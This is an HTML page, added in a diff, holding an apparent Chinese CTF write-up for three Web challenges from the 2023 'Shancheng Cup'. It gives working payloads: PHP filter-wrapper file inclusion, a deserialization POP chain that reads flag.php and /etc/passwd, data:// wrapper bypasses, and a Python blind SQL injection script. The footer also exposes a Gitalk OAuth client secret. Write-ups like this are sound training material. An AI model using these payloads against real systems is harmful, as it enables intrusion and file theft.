@@ -1,0 +1,384 @@
+<html>
+<head>
+    <meta charset="utf-8"/>
+<meta name="description" content=""/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+
+<title>首届“山城杯”大学生网络安全技能联赛初赛CTF(Web)-WP | via&#39;blog</title>
+
+<link rel="shortcut icon" href="https://via-labs.github.io/favicon.ico?v=1703223309304">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://via-labs.github.io/styles/main.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css">
+
+<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.15.10/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.15.10/languages/dart.min.js"></script>
+
+<script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script>
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <div class="navbar-brand">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            via&#39;blog
+        </div>
+    </div>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+                <div class="nav-item">
+                    
+                        <a href="/" class="menu gt-a-link">
+                            首页
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="https://via-labs.github.io/archives" class="menu gt-a-link">
+                            归档
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="/tags" class="menu gt-a-link">
+                            标签
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="/post/about" class="menu gt-a-link">
+                            关于
+                        </a>
+                    
+                </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1703223309304" action="/search/index.html">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    首届“山城杯”大学生网络安全技能联赛初赛CTF(Web)-WP
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2023-05-12 ·
+                    </time>
+                    
+                        <a href="https://via-labs.github.io/tag/5LaPh49_Q/" class="post-tags">
+                            # 技能竞赛
+                        </a>
+                    
+                        <a href="https://via-labs.github.io/tag/ppJWYxF_m/" class="post-tags">
+                            # ctf
+                        </a>
+                    
+                        <a href="https://via-labs.github.io/tag/oRQyXO5Wf/" class="post-tags">
+                            # php
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <h1 id="web-writeup">Web writeup:</h1>
+<h2 id="web1lesen">Web1(<strong>Lesen</strong>):</h2>
+<p><strong>考点：</strong></p>
+<blockquote>
+<p>文件包含 反序列化  伪协议</p>
+</blockquote>
+<p>界面：</p>
+<figure data-type="image" tabindex="1"><img src="https://cdn.jsdelivr.net/gh/via-labs/myimage@main/image.4jmmj2b2xew0.webp" alt="image" loading="lazy"></figure>
+<p><strong>源码：</strong></p>
+<pre><code class="language-php">&lt;?php
+error_reporting(0);
+highlight_file(__FILE__);
+$from = $_GET['from'];
+$to = $_GET['to'];
+if(!isset($from) or !isset($to) or stripos($from, &quot;flag&quot;)!=FALSE)
+{
+    $from = &quot;behind.php&quot;;
+}
+
+include($from);// read flag.php
+
+if(isset($to))
+{
+    $a = unserialize($to);
+    $a-&gt;sayTheFlag();
+}
+</code></pre>
+<p><strong>分析：</strong></p>
+<p>需get传递两个参数from，to。</p>
+<blockquote>
+<p>1.'from'不能包含&quot;flag&quot;字符串，否则默认值为&quot;behind.php&quot;。</p>
+<p>2.'to'变量需要反序列化一个对象。</p>
+</blockquote>
+<p>这里还不知道to需要跟啥参数，利用伪协议先用from读取behind.php或index.php源码</p>
+<p><code>http://192.168.10.221:58001/?from=php://filter/convert.base64-encode/resource=behind.php&amp;to=</code></p>
+<figure data-type="image" tabindex="2"><img src="https://cdn.jsdelivr.net/gh/via-labs/myimage@main/image.rxmo0p9r1og.webp" alt="image" loading="lazy"></figure>
+<p><strong>解码：</strong></p>
+<pre><code class="language-php">&lt;?php
+error_reporting(0);
+class Test
+{
+        public $notthis;
+        public $variable;
+        public function __call($t1, $t2)
+        {
+            print($this-&gt;notthis);
+        }
+
+}
+class NoUse
+{
+        public $notthis;
+        public $class;
+        public function __toString()
+        {
+            return file_get_contents($this-&gt;notthis);
+        }
+}
+?&gt;
+</code></pre>
+<p><strong>分析：</strong></p>
+<blockquote>
+<p>分析behind.php源码，index.php里调用sayTheFlag()，方法不存在，会自动调用<strong>call()魔术方法，接着print一个对象，就会自动调用其</strong>toString()，实现最终目标file_get_contents()读flag。流程：<code>sayTheFlag()</code> -&gt; <code>Test::__call()</code> -&gt; <code>NoUse::__toString()</code> -&gt; <code>file_get_contents()</code></p>
+</blockquote>
+<figure data-type="image" tabindex="3"><img src="https://cdn.jsdelivr.net/gh/via-labs/myimage@main/image.2w07iustyrs0.webp" alt="image" loading="lazy"></figure>
+<p>**总结：**这里其实有两种思路，分别从from,to入手，反序列化肯定是正解，第一个需fuzz没有被ban的过滤器。</p>
+<blockquote>
+<p>1.从from读取flag.php</p>
+<p>2.从to构造反序列化，读取flag.php</p>
+</blockquote>
+<p>实例化代码，构造反序列化链，伪协议读flag.php转换base64，最后序列化并URL编码</p>
+<pre><code class="language-php">&lt;?php
+    error_reporting(0);
+    class Test
+    {
+            public $notthis;
+            public $variable;
+            public function __call($t1, $t2)
+            {
+                print($this-&gt;notthis);
+            }
+
+    }
+    class NoUse
+    {
+            public $notthis;
+            public $class;
+            public function __toString()
+            {
+                return file_get_contents($this-&gt;notthis);
+            }
+    }
+
+    $a = new Test();
+    $a-&gt;notthis = new NoUse();
+    $a-&gt;notthis-&gt;notthis = 'php://filter/read=convert.base64-encode/resource=flag.php';
+
+    print(urlencode(serialize($a)));
+    // print(serialize($a));
+?&gt;
+</code></pre>
+<p>错误自定义单链：但只能读passwd</p>
+<pre><code>/?to=O:4:&quot;Test&quot;:1:{s:7:&quot;notthis&quot;;O:5:&quot;NoUse&quot;:1:{s:7:&quot;notthis&quot;;s:5:&quot;/etc/passwd&quot;;}}
+</code></pre>
+<p>实例化，构造反序列化链，先调call再调tostring。</p>
+<pre><code>/?to=O:4:&quot;Test&quot;:2:{s:7:&quot;notthis&quot;;O:5:&quot;NoUse&quot;:2:{s:7:&quot;notthis&quot;;s:8:&quot;flag.php&quot;;s:5:&quot;class&quot;;N;}s:8:&quot;variable&quot;;N;}
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://cdn.jsdelivr.net/gh/via-labs/myimage@main/image.4j34oev51w60.webp" alt="image" loading="lazy"></figure>
+<h2 id="web2one-two-three">Web2(<strong>One Two Three</strong>):</h2>
+<p>考点：</p>
+<blockquote>
+<p>PHP伪协议</p>
+</blockquote>
+<p>界面：</p>
+<figure data-type="image" tabindex="5"><img src="https://cdn.jsdelivr.net/gh/via-labs/myimage@main/image.3zs9p8f4gwo0.webp" alt="image" loading="lazy"></figure>
+<p>源码：</p>
+<pre><code class="language-php">&lt;?php
+
+highlight_file(__FILE__);
+error_reporting(0);
+include(&quot;ans.php&quot;);
+
+if(isset($_GET[&quot;one&quot;]) &amp;&amp; isset($_GET[&quot;two&quot;]) &amp;&amp; isset($_POST[&quot;three&quot;]))
+{
+    $one = $_GET[&quot;one&quot;];
+    $two = $_GET[&quot;two&quot;];
+
+    $three = $_POST[&quot;three&quot;];
+    if(!empty($one) &amp;&amp; !empty($two) &amp;&amp; !empty($three))
+    {
+        if(file_get_contents($two) === &quot;g00dJ0b&quot; and file_get_contents($three) ===  &quot;onTh1s&quot;)
+        {
+            var_dump($one);
+            include($one);
+        }
+    }
+    else
+        die(&quot;Insufficient Parameters&quot;);
+} D0n't try t0 tr1ck me!
+</code></pre>
+<p>利用data伪协议绕过file_get_contents()，one使用php伪协议读取ans.php,构造利用条件</p>
+<p>Payload：</p>
+<pre><code>http://192.168.10.221:58002/?one=php://filter/convert.base64-encode/resource=ans.php&amp;two=data://text/plain,g00dJ0b
+
+post:three=data://text/plain,onTh1s
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://cdn.jsdelivr.net/gh/via-labs/myimage@main/image.1l8v9f12e3vk.webp" alt="image" loading="lazy"></figure>
+<p>解码：</p>
+<figure data-type="image" tabindex="7"><img src="https://cdn.jsdelivr.net/gh/via-labs/myimage@main/image.31plryi8rxo0.webp" alt="image" loading="lazy"></figure>
+<h2 id="web3scorequery">Web3(<strong>ScoreQuery</strong>):</h2>
+<p>考点：布尔盲注</p>
+<p>界面：</p>
+<figure data-type="image" tabindex="8"><img src="https://cdn.jsdelivr.net/gh/via-labs/myimage@main/image.3wuiosj73ee0.webp" alt="image" loading="lazy"></figure>
+<p>经过fuzz发现，所有常见如' &quot; or select union and等关键字被过滤了但是'' sleep（）等成功执行，推测盲注。</p>
+<pre><code>import requests
+import string
+
+flagstr = &quot;1234567890qwertyuiopasdfghjklzxcvbnm}{-&quot;
+flag = ''
+url = &quot;http://192.168.10.221:58003/&quot;
+ 
+for i in range(1,45):
+    for c in flagstr:
+        tmp = url + &quot;?id=0'/**/or/**/substr((select/**/F1ag/**/from/**/TheFl4g),{},1)='{}'%23&quot;.format(i,c)
+        res = requests.get(tmp)
+        if len(res.text) == 2263:
+            flag += c
+            print(flag)
+            break
+</code></pre>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://via-labs.github.io/post/2022-360-qgb/" class="post-title gt-a-link">
+                    2022 360强国杯决赛Web-writeup
+                </a>
+            </div>
+        
+
+        
+
+        
+            
+                <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js"></script>
+<script>
+    // md5.min.js
+    !function(n){
+        "use strict";
+        function d(n,t){var r=(65535&n)+(65535&t);return(n>>16)+(t>>16)+(r>>16)<<16|65535&r}
+        function f(n,t,r,e,o,u){return d((c=d(d(t,n),d(e,u)))<<(f=o)|c>>>32-f,r);var c,f}
+        function l(n,t,r,e,o,u,c){return f(t&r|~t&e,n,t,o,u,c)}
+        function v(n,t,r,e,o,u,c){return f(t&e|r&~e,n,t,o,u,c)}
+        function g(n,t,r,e,o,u,c){return f(t^r^e,n,t,o,u,c)}
+        function m(n,t,r,e,o,u,c){return f(r^(t|~e),n,t,o,u,c)}
+        function i(n,t){var r,e,o,u,c;n[t>>5]|=128<<t%32,n[14+(t+64>>>9<<4)]=t;var f=1732584193,i=-271733879,a=-1732584194,h=271733878;for(r=0;r<n.length;r+=16)f=l(e=f,o=i,u=a,c=h,n[r],7,-680876936),h=l(h,f,i,a,n[r+1],12,-389564586),a=l(a,h,f,i,n[r+2],17,606105819),i=l(i,a,h,f,n[r+3],22,-1044525330),f=l(f,i,a,h,n[r+4],7,-176418897),h=l(h,f,i,a,n[r+5],12,1200080426),a=l(a,h,f,i,n[r+6],17,-1473231341),i=l(i,a,h,f,n[r+7],22,-45705983),f=l(f,i,a,h,n[r+8],7,1770035416),h=l(h,f,i,a,n[r+9],12,-1958414417),a=l(a,h,f,i,n[r+10],17,-42063),i=l(i,a,h,f,n[r+11],22,-1990404162),f=l(f,i,a,h,n[r+12],7,1804603682),h=l(h,f,i,a,n[r+13],12,-40341101),a=l(a,h,f,i,n[r+14],17,-1502002290),f=v(f,i=l(i,a,h,f,n[r+15],22,1236535329),a,h,n[r+1],5,-165796510),h=v(h,f,i,a,n[r+6],9,-1069501632),a=v(a,h,f,i,n[r+11],14,643717713),i=v(i,a,h,f,n[r],20,-373897302),f=v(f,i,a,h,n[r+5],5,-701558691),h=v(h,f,i,a,n[r+10],9,38016083),a=v(a,h,f,i,n[r+15],14,-660478335),i=v(i,a,h,f,n[r+4],20,-405537848),f=v(f,i,a,h,n[r+9],5,568446438),h=v(h,f,i,a,n[r+14],9,-1019803690),a=v(a,h,f,i,n[r+3],14,-187363961),i=v(i,a,h,f,n[r+8],20,1163531501),f=v(f,i,a,h,n[r+13],5,-1444681467),h=v(h,f,i,a,n[r+2],9,-51403784),a=v(a,h,f,i,n[r+7],14,1735328473),f=g(f,i=v(i,a,h,f,n[r+12],20,-1926607734),a,h,n[r+5],4,-378558),h=g(h,f,i,a,n[r+8],11,-2022574463),a=g(a,h,f,i,n[r+11],16,1839030562),i=g(i,a,h,f,n[r+14],23,-35309556),f=g(f,i,a,h,n[r+1],4,-1530992060),h=g(h,f,i,a,n[r+4],11,1272893353),a=g(a,h,f,i,n[r+7],16,-155497632),i=g(i,a,h,f,n[r+10],23,-1094730640),f=g(f,i,a,h,n[r+13],4,681279174),h=g(h,f,i,a,n[r],11,-358537222),a=g(a,h,f,i,n[r+3],16,-722521979),i=g(i,a,h,f,n[r+6],23,76029189),f=g(f,i,a,h,n[r+9],4,-640364487),h=g(h,f,i,a,n[r+12],11,-421815835),a=g(a,h,f,i,n[r+15],16,530742520),f=m(f,i=g(i,a,h,f,n[r+2],23,-995338651),a,h,n[r],6,-198630844),h=m(h,f,i,a,n[r+7],10,1126891415),a=m(a,h,f,i,n[r+14],15,-1416354905),i=m(i,a,h,f,n[r+5],21,-57434055),f=m(f,i,a,h,n[r+12],6,1700485571),h=m(h,f,i,a,n[r+3],10,-1894986606),a=m(a,h,f,i,n[r+10],15,-1051523),i=m(i,a,h,f,n[r+1],21,-2054922799),f=m(f,i,a,h,n[r+8],6,1873313359),h=m(h,f,i,a,n[r+15],10,-30611744),a=m(a,h,f,i,n[r+6],15,-1560198380),i=m(i,a,h,f,n[r+13],21,1309151649),f=m(f,i,a,h,n[r+4],6,-145523070),h=m(h,f,i,a,n[r+11],10,-1120210379),a=m(a,h,f,i,n[r+2],15,718787259),i=m(i,a,h,f,n[r+9],21,-343485551),f=d(f,e),i=d(i,o),a=d(a,u),h=d(h,c);return[f,i,a,h]}
+        function a(n){var t,r="",e=32*n.length;for(t=0;t<e;t+=8)r+=String.fromCharCode(n[t>>5]>>>t%32&255);return r}
+        function h(n){var t,r=[];for(r[(n.length>>2)-1]=void 0,t=0;t<r.length;t+=1)r[t]=0;var e=8*n.length;for(t=0;t<e;t+=8)r[t>>5]|=(255&n.charCodeAt(t/8))<<t%32;return r}
+        function e(n){var t,r,e="0123456789abcdef",o="";for(r=0;r<n.length;r+=1)t=n.charCodeAt(r),o+=e.charAt(t>>>4&15)+e.charAt(15&t);return o}
+        function r(n){return unescape(encodeURIComponent(n))}
+        function o(n){return a(i(h(t=r(n)),8*t.length));var t}
+        function u(n,t){return function(n,t){var r,e,o=h(n),u=[],c=[];for(u[15]=c[15]=void 0,16<o.length&&(o=i(o,8*n.length)),r=0;r<16;r+=1)u[r]=909522486^o[r],c[r]=1549556828^o[r];return e=i(u.concat(h(t)),512+8*t.length),a(i(c.concat(e),640))}(r(n),r(t))}
+        function t(n,t,r){return t?r?u(t,n):e(u(t,n)):r?o(n):e(o(n))}
+        "function"==typeof define&&define.amd?define(function(){return t}):"object"==typeof module&&module.exports?module.exports=t:n.md5=t;
+    }(this);
+</script>
+
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: 'ed500abea11a127cb6f5',
+    clientSecret: '64bda14309e859f0d723d7576d5c8b35bff3b456',
+    repo: 'via-labs.github.io',
+    owner: 'via-labs',
+    admin: ['via-labs'],
+    id: md5(location.pathname),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false       // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+            
+
+            
+        
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first">江畔何人初见月？江月何年初照人？</div>
+    <div class="social-container">
+        
+            
+                <a href="https://github.com/via-labs/via-labs.github.io" target="_blank">
+                    <i class="fab fa-github gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+    </div>
+    <div class="footer-info">
+        Powered by <a href="https://github.com/via-labs" target="_blank">via</a>
+    </div>    
+</div>
+
+<script>
+  hljs.initHighlightingOnLoad()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
